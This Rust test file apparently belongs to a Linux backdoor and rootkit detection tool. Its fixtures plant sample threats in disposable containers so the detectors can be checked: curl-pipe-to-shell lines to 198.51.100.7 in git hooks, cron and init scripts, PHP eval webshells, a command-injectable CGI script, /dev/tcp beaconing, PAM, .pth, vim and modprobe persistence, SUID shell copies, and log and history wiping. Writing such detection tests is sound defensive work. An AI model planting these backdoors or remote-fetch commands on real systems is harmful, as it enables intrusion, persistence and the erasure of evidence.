//! Disposable-container fixture run for the backdoor and rootkit entries.
//! Each case runs the catalog's own container command (the same text
//! `execute_in_container` sends) and decides hits with the entry's own rule.
//! Driven by `LOVELYHAWK_LAB_CONTAINERS=<family>=<container>[,...]` with
//! `LOVELYHAWK_LAB_CLI` (default `podman`); the probe owns the containers.

use super::{SystemFamily, guarded_container_command, lookup};
use crate::command_findings::finding_lines;
use std::process::Command;
use std::time::Instant;

struct Case {
    id: &'static str,
    fixture: &'static str,
    expect: &'static [&'static str],
    /// Markers only expected when a package manager (dpkg/rpm) is available
    /// on the target; skipped when the collector reports the ownership gap.
    expect_pkg: &'static [&'static str],
    quiet: &'static [&'static str],
    /// Families where the quiet check is skipped because the container
    /// runtime itself produces findings (e.g. podman machine helpers
    /// visible as hidden processes), not because the entry is wrong.
    quiet_skip: &'static [&'static str],
}

/// Baseline tools the disposable lab image itself is missing; installed
/// once per container before fixtures so the collectors run their real
/// paths instead of degrading into tool-gap output.
const SETUP: &[(&str, &str)] = &[(
    "redhat",
    "command -v find >/dev/null 2>&1 || microdnf install -y findutils >/dev/null 2>&1 || dnf install -y findutils >/dev/null 2>&1 || yum install -y findutils >/dev/null 2>&1",
)];

const CASES: &[Case] = &[
    Case {
        id: "middleware-lighttpd",
        fixture: "export DEBIAN_FRONTEND=noninteractive; apt-get update -qq >/dev/null 2>&1 && apt-get install -y -qq lighttpd >/dev/null 2>&1; mkdir -p /var/www/cgi-bin /etc/lighttpd/conf-enabled; printf '#!/bin/sh\nping -c1 $QUERY_STRING\n' > /var/www/cgi-bin/diag.sh; chmod +x /var/www/cgi-bin/diag.sh; for p in /proc/[0-9]*/comm; do case \"$(cat $p 2>/dev/null)\" in lighttpd*) ;; *) continue;; esac; pid=${p#/proc/}; kill -9 ${pid%/comm} 2>/dev/null; done; printf 'server.modules += ( \"mod_cgi\", \"mod_alias\" )
cgi.assign = ( \".sh\" => \"\" )
alias.url = ( \"/cgi-bin/\" => \"/var/www/cgi-bin/\" )
dir-listing.activate = \"enable\"
' > /etc/lighttpd/conf-enabled/60-lhlab.conf; cp \"$(command -v tail)\" /tmp/lighttpd; /tmp/lighttpd -f /etc/lighttpd/lighttpd.conf </dev/null >/dev/null 2>&1 & sleep 1",
        expect: &["cgi.assign", "目录列表", "diag.sh"],
        expect_pkg: &[],
        quiet: &[],
        quiet_skip: &[],
    },

    Case {
        id: "process-exe-path",
        fixture: "mkdir -p /tmp/lhbin; cp \"$(command -v sh)\" /tmp/lhbin/sh 2>/dev/null || cp /bin/busybox /tmp/lhbin/sh; chmod +x /tmp/lhbin/sh; (/tmp/lhbin/sh -c 'sleep 120 & wait' </dev/null >/dev/null 2>&1 &); sleep 1",
        expect: &["/tmp/lhbin/sh"],
        expect_pkg: &[],
        quiet: &[],
        quiet_skip: &[],
    },
    Case {
        id: "persistence-pam",
        fixture: "mkdir -p /etc/pam.d; printf 'auth optional pam_exec.so /tmp/x\\n# auth optional pam_exec.so /tmp/quiet\\n' > /etc/pam.d/lhtest",
        expect: &["pam_exec.so /tmp/x"],
        expect_pkg: &[],
        quiet: &["/tmp/quiet"],
        quiet_skip: &[],
    },
    Case {
        id: "persistence-inetd",
        fixture: "printf \"sshd: ALL : spawn (/bin/sh -c 'id') &\\n\" >> /etc/hosts.allow",
        expect: &["spawn"],
        expect_pkg: &[],
        quiet: &[],
        quiet_skip: &[],
    },
    Case {
        id: "persistence-python-pth",
        fixture: "d=/usr/lib/python3/dist-packages; mkdir -p $d; printf \"import os; os.system('id')\\n\" > $d/lhtest.pth; printf \"import os; var = 'SETUPTOOLS_USE_DISTUTILS'; enabled = os.environ.get(var, 'local') == 'local'; enabled and __import__('_distutils_hack').add_shim(); \\n\" > $d/distutils-precedence.pth",
        expect: &["lhtest.pth"],
        expect_pkg: &[],
        quiet: &["distutils-precedence.pth"],
        quiet_skip: &[],
    },
    Case {
        id: "persistence-git-hooks",
        fixture: "h=/root/repo/.git/hooks; mkdir -p $h; printf '#!/bin/sh\\ncurl http://198.51.100.7/x | sh\\n' > $h/post-merge; chmod +x $h/post-merge; printf '#!/bin/sh\\n' > $h/pre-commit.sample; chmod +x $h/pre-commit.sample",
        expect: &["post-merge"],
        expect_pkg: &[],
        quiet: &["pre-commit.sample"],
        quiet_skip: &[],
    },
    Case {
        id: "log-web-trace",
        fixture: "mkdir -p /var/log/nginx /var/www/html; printf '10.0.0.1 - - [01/Jan/2025:00:00:00 +0000] \"POST /.a.php HTTP/1.1\" 200 12 \"-\" \"x\"\\n10.0.0.1 - - [01/Jan/2025:00:00:01 +0000] \"GET /index.php HTTP/1.1\" 200 9 \"-\" \"x\"\\n' > /var/log/nginx/access.log; printf '<?php' > /var/www/html/.a.php",
        expect: &["/.a.php", "存在：/var/www/html/.a.php"],
        expect_pkg: &[],
        quiet: &["/index.php"],
        quiet_skip: &[],
    },
    Case {
        id: "file-web-version",
        fixture: "mkdir -p /var/www/html/thinkphp /var/www/html/pma; printf '<?php define(\"THINK_VERSION\",\"5.0.24\");' > /var/www/html/thinkphp/base.php; printf '<?php class Smarty { const SMARTY_VERSION = \"3.1.48\"; }' > /var/www/html/pma/Smarty.class.php",
        expect: &["ThinkPHP", "5.0.24", "需人工核对"],
        expect_pkg: &[],
        quiet: &["3.1.48"],
        quiet_skip: &[],
    },
    Case {
        id: "file-rootkit-signatures",
        fixture: "mkdir -p /dev/tux /bin; touch /dev/tux/.proc /bin/.login",
        expect: &["/dev/tux/.proc"],
        expect_pkg: &[],
        quiet: &["/dev/tux/.file"],
        quiet_skip: &[],
    },
    Case {
        id: "network-hidden-ports",
        fixture: "",
        expect: &[],
        expect_pkg: &[],
        quiet: &["关注："],
        quiet_skip: &[],
    },
    Case {
        id: "network-bind-probe",
        fixture: "",
        expect: &[],
        expect_pkg: &[],
        quiet: &["关注："],
        quiet_skip: &[],
    },
    Case {
        id: "network-outbound-periodic",
        fixture: "lh_b() { if command -v bash >/dev/null 2>&1; then timeout 4 bash -c 'exec 3<>/dev/tcp/10.89.99.5/18888; sleep 2' 2>/dev/null; elif command -v nc >/dev/null 2>&1; then sleep 2 | nc -w 4 10.89.99.5 18888 >/dev/null 2>&1; fi; }; ( while :; do lh_b; sleep 1; done </dev/null >/dev/null 2>&1 & ); if command -v bash >/dev/null 2>&1; then ( bash -c 'exec 3<>/dev/tcp/10.89.99.5/17777; exec sleep 90' </dev/null >/dev/null 2>&1 & ); elif command -v nc >/dev/null 2>&1; then ( sleep 90 | nc 10.89.99.5 17777 >/dev/null 2>&1 & ); fi; sleep 2",
        expect: &["10.89.99.5:18888", "间隔中位约"],
        expect_pkg: &[],
        quiet: &["10.89.99.5:17777"],
        quiet_skip: &[],
    },
    Case {
        id: "system-lkm",
        fixture: "mkdir -p /usr/local/lib; touch /usr/local/lib/lhlab.ko",
        expect: &["lhlab.ko"],
        expect_pkg: &[],
        quiet: &[],
        quiet_skip: &[],
    },
    Case {
        id: "perm-dt-needed",
        fixture: "",
        expect: &[],
        expect_pkg: &[],
        quiet: &["关注："],
        quiet_skip: &[],
    },
    Case {
        id: "file-command-evidence",
        fixture: "touch -d '2001-01-01' /usr/bin/ping /bin/ping 2>/dev/null",
        expect: &["修改时间偏离"],
        expect_pkg: &[],
        quiet: &[],
        quiet_skip: &[],
    },
    Case {
        id: "persistence-chain",
        fixture: "mkdir -p /etc/cron.d /tmp/lhchain; printf '#!/bin/sh
. /tmp/lhchain/second.sh
' > /tmp/lhchain/first.sh; printf '#!/bin/sh
curl http://198.51.100.7/x | sh
' > /tmp/lhchain/second.sh; printf '*/5 * * * * root /tmp/lhchain/first.sh
' > /etc/cron.d/lhchain",
        expect: &["second.sh"],
        expect_pkg: &[],
        quiet: &["first.sh | 第"],
        quiet_skip: &[],
    },
    Case {
        id: "perm-suid-ownership",
        fixture: "cp /bin/ls /usr/local/bin/lhlab 2>/dev/null || cp /bin/busybox /usr/local/bin/lhlab; chmod 4755 /usr/local/bin/lhlab; mkdir -p /opt/lhlab; cp \"$(command -v sh)\" /opt/lhlab/find 2>/dev/null || cp /bin/busybox /opt/lhlab/find; chmod 4755 /opt/lhlab/find",
        expect: &["GTFOBins"],
        expect_pkg: &["lhlab"],
        quiet: &[],
        quiet_skip: &[],
    },
    Case {
        id: "persistence-unit-owner",
        fixture: "mkdir -p /etc/systemd/system; printf '[Service]
ExecStart=/tmp/lhlab.sh
' > /etc/systemd/system/lhlab.service",
        expect: &[],
        expect_pkg: &["lhlab.service", "ExecStart=/tmp/lhlab.sh"],
        quiet: &[],
        quiet_skip: &[],
    },
    Case {
        id: "file-smarty-templates-c",
        fixture: "mkdir -p /var/www/html/templates_c /var/www/html/templates; printf '<?php eval($_POST[\"lh\"]);' > /var/www/html/templates_c/aa11_file_index.tpl.php; printf '{if $lh}ok{/if}' > /var/www/html/templates/index.tpl",
        expect: &["templates_c/aa11_file_index.tpl.php", "执行/解码特征"],
        expect_pkg: &[],
        quiet: &[],
        quiet_skip: &[],
    },
    Case {
        id: "file-webshell-hint",
        fixture: "mkdir -p /var/www/html; printf '<?php eval($_POST[\"lh\"]);' > /var/www/html/lhlab.php",
        expect: &["/var/www/html/lhlab.php"],
        expect_pkg: &[],
        quiet: &[],
        quiet_skip: &[],
    },
    Case {
        id: "system-modules",
        fixture: "",
        expect: &[],
        expect_pkg: &[],
        quiet: &["关注："],
        quiet_skip: &[],
    },
    Case {
        id: "process-hidden",
        fixture: "",
        expect: &[],
        expect_pkg: &[],
        quiet: &["关注："],
        quiet_skip: &["redhat"],
    },
    Case {
        id: "persistence-editor-config",
        fixture: "mkdir -p /root/.vim/plugin; printf '\" config\\nset modeline\\nautocmd BufRead * :!id\\nset number\\n' > /root/.vimrc; printf 'call system(\"id\")\\n' > /root/.vim/plugin/x.vim; printf '\" clean\\nset number\\nset nomodeline\\n' > /root/.exrc",
        expect: &["set modeline", "autocmd", "x.vim"],
        expect_pkg: &[],
        quiet: &["set number", "nomodeline"],
        quiet_skip: &[],
    },
    Case {
        id: "startup-init-package-verify",
        fixture: "if command -v apk >/dev/null 2>&1; then { [ -d /etc/init.d ] || apk add --no-cache openrc >/dev/null 2>&1; printf '# injected\\n' >> /etc/init.d/dmesg 2>/dev/null; printf 'x\\n' > /etc/init.d/lhlab-unowned; }; elif command -v dpkg >/dev/null 2>&1; then { dpkg -S /etc/init.d/cron >/dev/null 2>&1 || { apt-get update -qq >/dev/null 2>&1 && apt-get install -y -qq cron >/dev/null 2>&1; }; printf 'curl http://198.51.100.7/x | sh\\n' >> /etc/init.d/cron 2>/dev/null; printf 'x\\n' > /etc/init.d/lhlab-unowned; (cd /tmp && apt-get download cron >/dev/null 2>&1 && cp cron_*.deb /var/cache/apt/archives/ 2>/dev/null); }; elif command -v rpm >/dev/null 2>&1; then { [ -d /etc/init.d ] || microdnf install -y initscripts >/dev/null 2>&1 || dnf install -y initscripts >/dev/null 2>&1 || yum install -y initscripts >/dev/null 2>&1; lh_rpmfile=$(for c in /etc/init.d/*; do [ -f \"$c\" ] && [ ! -L \"$c\" ] && rpm -qf \"$c\" >/dev/null 2>&1 && { echo \"$c\"; break; }; done); [ -n \"$lh_rpmfile\" ] && printf '# injected\\n' >> \"$lh_rpmfile\"; printf 'x\\n' > /etc/init.d/lhlab-unowned; }; fi",
        expect: &["不一致", "lhlab-unowned"],
        expect_pkg: &[],
        quiet: &["结论：一致"],
        quiet_skip: &[],
    },
    Case {
        id: "log-tamper-signs",
        fixture: ": > /var/log/auth.log; ln -sf /dev/null /root/.bash_history",
        expect: &["auth.log", "符号链接"],
        expect_pkg: &[],
        quiet: &["secure"],
        quiet_skip: &[],
    },
    Case {
        id: "persistence-profile-content",
        fixture: "printf 'export HISTFILE=/dev/null\\nunset HISTFILE\\nexport HISTCONTROL=ignorespace\\n' >> /etc/profile",
        expect: &["HISTFILE=/dev/null", "unset HISTFILE"],
        expect_pkg: &[],
        quiet: &["ignorespace"],
        quiet_skip: &[],
    },
    Case {
        id: "system-module-revival-points",
        fixture: "printf 'insmod /tmp/lhrev.ko\\n# insmod /tmp/quiet.ko\\n' >> /etc/profile; mkdir -p /etc/cron.d /etc/init.d /etc/modprobe.d /etc/modules-load.d; printf '* * * * * root /sbin/modprobe lhrev\\n' > /etc/cron.d/lhrev; printf '#!/bin/sh\\nmodprobe lhinit\\n' > /etc/init.d/lhrevinit; printf 'lh_nonexistent_mod\\n# loop\\n' > /etc/modules-load.d/lhrev.conf; printf 'install lhinj /bin/sh /tmp/x\\nsoftdep lhinj post: /tmp/rearm\\noptions lhinj quiet=1\\n' > /etc/modprobe.d/lhrev.conf; touch /tmp/lhrev.ko",
        expect: &[
            "/etc/profile",
            "cron.d/lhrev",
            "init.d/lhrevinit",
            "lhrev.ko",
            "lhrev.conf",
        ],
        expect_pkg: &[],
        quiet: &[
            "quiet.ko",
            "quiet=1",
            "文件属性：/etc/modules-load.d/lhrev.conf | 第 2 行",
        ],
        quiet_skip: &[],
    },
];

fn cli() -> String {
    std::env::var("LOVELYHAWK_LAB_CLI").unwrap_or_else(|_| "podman".to_owned())
}

fn exec(container: &str, script: &str) -> String {
    let output = Command::new(cli())
        .args(["exec", container, "/bin/sh", "-c", script])
        .output()
        .expect("container CLI");
    String::from_utf8_lossy(&output.stdout).into_owned()
}

fn family(name: &str) -> SystemFamily {
    match name {
        "debian" => SystemFamily::Debian,
        "alpine" => SystemFamily::Alpine,
        "redhat" => SystemFamily::RedHat,
        other => panic!("unknown family {other}"),
    }
}

#[test]
#[ignore = "needs disposable containers named in LOVELYHAWK_LAB_CONTAINERS"]
fn backdoor_entries_flag_container_fixtures() {
    let containers = std::env::var("LOVELYHAWK_LAB_CONTAINERS").expect("containers");
    let mut failures = Vec::new();
    for pair in containers.split(',') {
        let (name, container) = pair.split_once('=').expect("family=container");
        for (family_name, setup) in SETUP {
            if *family_name == name {
                exec(container, setup);
            }
        }
        for case in CASES {
            if !case.fixture.is_empty() {
                exec(container, case.fixture);
            }
            let definition = lookup(case.id).expect("catalog entry");
            let command = guarded_container_command(&definition, family(name));
            let started = Instant::now();
            let output = exec(container, &command);
            let elapsed = started.elapsed();
            let lines: Vec<&str> = output.lines().collect();
            let flagged: Vec<&str> = finding_lines(&output, definition.abnormal)
                .into_iter()
                .filter_map(|line| lines.get(line as usize).copied())
                .collect();
            println!(
                "== {name} {} {:.1}s flagged={}\n{output}",
                case.id,
                elapsed.as_secs_f64(),
                flagged.len()
            );
            for marker in case.expect {
                if !flagged.iter().any(|line| line.contains(marker)) {
                    failures.push(format!("{name} {}: no flagged line with {marker}", case.id));
                }
            }
            let pkg_known = !output.contains("缺少 dpkg 与 rpm");
            for marker in case.expect_pkg {
                if pkg_known && !flagged.iter().any(|line| line.contains(marker)) {
                    failures.push(format!("{name} {}: no flagged line with {marker}", case.id));
                }
            }
            for marker in case.quiet {
                if case.quiet_skip.contains(&name) {
                    break;
                }
                if flagged.iter().any(|line| line.contains(marker)) {
                    failures.push(format!("{name} {}: flagged quiet line {marker}", case.id));
                }
            }
            if elapsed.as_secs() >= definition.entry.timeout_seconds {
                failures.push(format!("{name} {}: exceeded timeout", case.id));
            }
        }
    }
    assert!(failures.is_empty(), "{}", failures.join("\n"));
}
